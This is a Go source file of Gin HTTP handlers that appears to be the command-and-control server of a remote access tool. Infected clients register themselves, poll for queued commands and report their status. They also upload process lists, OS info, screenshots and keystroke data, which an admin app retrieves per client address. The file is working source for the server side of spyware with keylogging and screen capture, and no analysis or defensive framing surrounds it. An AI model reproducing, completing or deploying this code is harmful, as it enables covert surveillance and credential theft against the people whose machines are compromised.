package utils

import (
	"io"
	"net/http"
	"strconv"
	"sync"
	"x_server/types"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)


type ProcessesContainer struct
{
	mu sync.Mutex
	ProcessesMap map[string]*[]types.Process
}



func (q * ProcessesContainer)SetProcesses(addr * string, processes * []types.Process) {
	q.ProcessesMap[*addr] = processes
}

func (q * ProcessesContainer)GetProcesses(addr * string) *[]types.Process {

	data, ok := q.ProcessesMap[*addr]

	if (!ok) {
		return nil
	}

	return data
}

func (q * ProcessesContainer)GetProcessCount(addr * string) int {
	data, ok := q.ProcessesMap[*addr]

	if (!ok) {
		return 0
	}

	return len(*data)
}

var ClientsProcesses = ProcessesContainer{ProcessesMap: make(map[string]*[]types.Process)}

var ClientsOSInfos	 	sync.Map
var ClientsScreenShots 	sync.Map
var ClientsKeyboardData	sync.Map


var ClientInfoAboutCommands *int = nil

var DB * gorm.DB = nil

func GetClientIPAddress(c * gin.Context) string {
	return c.ClientIP()
}

func ReadRequestDataAsType(obj any, in * io.ReadCloser)  {

	var outStr string
	GetRequestBodyAsString(in, &outStr)
	FromJson(obj, &outStr)
}

func AddClient(c * gin.Context) {

	client := types.Client{}
	ReadRequestDataAsType(&client, &c.Request.Body)

	var id int
	value, status := AddClientDB(DB, &client, &id, GetClientIPAddress(c));

	if (status == CLIENT_ADD_FAILURE) {
		c.String(http.StatusInternalServerError, "client add error")
		return
	}

	c.JSON(http.StatusOK, value)
}



func UpdateClientOsInfo(c * gin.Context) {

	os_info := types.OSInfo{}
	ReadRequestDataAsType(&os_info, &c.Request.Body)
	
	addr := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.String(http.StatusNotFound, "404, no such client")
		return
	}
	
	ClientsOSInfos.Store(addr, &os_info)

	c.String(http.StatusOK, "operating system info updated")
}

func GetClientOSInfo(c * gin.Context) {

	addr := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	value, ok := ClientsOSInfos.Load(addr)

	if (!ok) {
		c.JSON(http.StatusNotFound, nil)
	} else {
		c.JSON(http.StatusOK, value)
	}

}


func UpdateClientProcessesById(c * gin.Context) {

	ip := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB, ip) == nil) {
		c.String(http.StatusNotFound, "404, no such host")
		return
	}
	
	var processes []types.Process
	ReadRequestDataAsType(&processes, &c.Request.Body)

	ClientsProcesses.mu.Lock()

	ClientsProcesses.SetProcesses(&ip, &processes)
	
	ClientsProcesses.mu.Unlock()

	c.String(http.StatusOK, "processes updated")
}

func GetProcesses(c * gin.Context) {

	addr := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	ClientsProcesses.mu.Lock()

	processes, ok := ClientsProcesses.ProcessesMap[addr]
	if (ok) {
		c.JSON(http.StatusOK, processes)
	} else {
		c.JSON(http.StatusNotFound, nil)
	}

	ClientsProcesses.mu.Unlock()
}

// sends command to client

func PollCommand(c * gin.Context) {

	ip := GetClientIPAddress(c)

	client := FindClientByIpAddrDB(DB, ip)
	
	if (client == nil) {
		c.String(http.StatusNotFound, "404, client is not registered, register is done by it own")
		return
	}

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))

	cmd, stat := GetCommandByClientAddr(ip, cmd_type)

	if (stat == ERR_NO_ERR) {

		c.JSON(http.StatusOK, cmd)
		return;
	}

	c.String(http.StatusNotFound, "404, no such command, or list for you is unregistered :)")
}


func AddCommand(c * gin.Context) {

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))
	client_addr := c.Param("client_addr")

	if (FindClientByIpAddrDB(DB, client_addr) == nil) {
		c.String(http.StatusNotFound, "404, no such client")
		return
	}

	if (!types.IsWellKnown(cmd_type)) {
		c.String(http.StatusNotFound, "404, no such command exist")
		return
	}

	if (!IsStorageForClientExists(&client_addr)) {
		CreateNewCommandStorage(client_addr)
	
	} else if (IsSuchCommandAlreadyInCommandList(&client_addr, cmd_type)) {
		c.String(http.StatusNotModified, "")
		return
	}

	cmd := types.CreateNewReady(cmd_type)

	PushNewCommandToStorage(cmd, client_addr)

	c.String(http.StatusNoContent, "")
}

func UpdateCommand(c * gin.Context) {

	ip := GetClientIPAddress(c)

	client := FindClientByIpAddrDB(DB, ip)

	if (client == nil) {

		c.String(http.StatusNotFound, "404, client is not registered")
		return
	}

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))

	cmd_state_new := types.Command{}

	ReadRequestDataAsType(&cmd_state_new, &c.Request.Body)

	if (!IsSuchCommandAlreadyInCommandList(&ip, cmd_type)) {
		c.String(http.StatusNotFound, "404, command not found for client")
		return
	}


	if (UpdateCommandByClientAddr(&ip, cmd_type, &cmd_state_new)) {
		c.String(http.StatusOK, "command updated")
	} else {
		c.String(http.StatusInternalServerError, "command wasn't updated")
	}
}

func RemoveCommand(c * gin.Context) {

	cmd_type, _ 	:= strconv.Atoi(c.Param("cmd_type"))
	addr 		:= 	c.Param("client_addr")

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.String(http.StatusNotFound, "404, client not found on the server")
		return;
	}

	if (DeleteCommandByClientAddr(&addr, cmd_type) != -1) {
		c.String(http.StatusNoContent, "command deleted")
	} else {
		c.String(http.StatusNotFound, "command wasn't deleted")
	}

}

func PollCommandStatus(c * gin.Context) {

	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))
	client_addr := c.Param("client_addr")

	if (FindClientByIpAddrDB(DB, client_addr) == nil) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	cmd, stat := GetCommandByClientAddr(client_addr, cmd_type)

	if (stat == ERR_NO_CONTAINER_SET || stat == ERR_NO_SUCH_COMMAND) {
		c.JSON(http.StatusNotFound, nil)
		return
	}

	if (cmd.Status == types.CMD_STATUS_SYSTEM_ERROR) {
		c.JSON(http.StatusInternalServerError, nil)
	} else if (cmd.Status == types.CMD_STATUS_SUCCESS) {
		c.JSON(http.StatusNoContent, nil)
	} else {
		c.JSON(http.StatusNotModified, nil)
	}

}

func PollClients(c * gin.Context) {

	clients, err := GetAllRegisteredClients(DB)

	if (err != nil) {
		c.JSON(http.StatusInternalServerError, nil)
		return
	}

	c.JSON(http.StatusOK, clients)

}

func CheckAboutCommandFailure(c * gin.Context) {

	ip := GetClientIPAddress(c)
	cmd_type, _ := strconv.Atoi(c.Param("cmd_type"))
	if (FindClientByIpAddrDB(DB, ip) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	cmd, err := GetCommandByClientAddr(ip, cmd_type)

	if (err != ERR_NO_ERR) {
		c.String(http.StatusNotFound, "")
		return;
	}

	if (cmd.Status == types.CMD_STATUS_SYSTEM_ERROR) {
		c.String(http.StatusOK, "")
	} else {
		c.Status(http.StatusNotModified)
	}

}

func KeepAliveClient(c * gin.Context) {

	// updates client

	addr := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB,addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	client := types.Client{}
	ReadRequestDataAsType(&client, &c.Request.Body)

	if (UpdateClientDB(DB, &client)) {
		c.String(http.StatusNoContent, "client updated")
	} else {
		c.String(http.StatusInternalServerError, "client not updated")
	}

}

func DisconnectClient(c * gin.Context) {

	// sets client's online status to false
	// sets os info running time of client to -1
	// removes all resources from maps etc. (frees memory)

	addr := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	RemoveAllClientCommands(&addr)
	RemoveClientContainer(&addr)

	delete(ClientsProcesses.ProcessesMap, addr)
	ClientsOSInfos.Delete(addr)
}

func PostClientScreenshot(c * gin.Context) {

	addr := GetClientIPAddress(c)
	bytes, err := io.ReadAll(c.Request.Body)

	if (err != nil) {
		c.String(http.StatusInternalServerError, "");
	} else {
		
		ClientsScreenShots.Store(addr, &bytes)
	}

}

func FetchClientLastScreen(c * gin.Context) {

	addr := c.Param("client_addr")

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	value, ok := ClientsScreenShots.Load(addr)

	if (!ok) {
		c.String(http.StatusNotFound, "")
	} else {

		c.Header("Content-Type", "image/bmp")
		c.Header("Content-Encoding", "deflate")

		real_data := value.(*[]byte)
		c.Writer.Write(*real_data)

		ClientsScreenShots.Delete(addr)

	}

}

// client sends keyboard data
func AddClientKeyboardData(c * gin.Context) {

	addr := GetClientIPAddress(c)

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	bytes, _ := io.ReadAll(c.Request.Body)

	ClientsKeyboardData.Store(addr, &bytes)
	c.String(http.StatusNoContent, "")
}

// admin app requesting data

func GetClientKeyboardData(c * gin.Context) {

	addr := c.Param("client_addr")

	if (FindClientByIpAddrDB(DB, addr) == nil) {
		c.String(http.StatusNotFound, "")
		return
	}

	value, ok := ClientsKeyboardData.Load(addr)

	if (ok) {
		compressedBytes := value.(*[]byte)
		c.Header("Content-Type", "text/plain; charset=utf8")
		c.Header("Content-Encoding", "deflate")

		c.Writer.Write(*compressedBytes)
		ClientsKeyboardData.Delete(addr)

	} else {
		c.String(http.StatusNotFound, "")

	}

}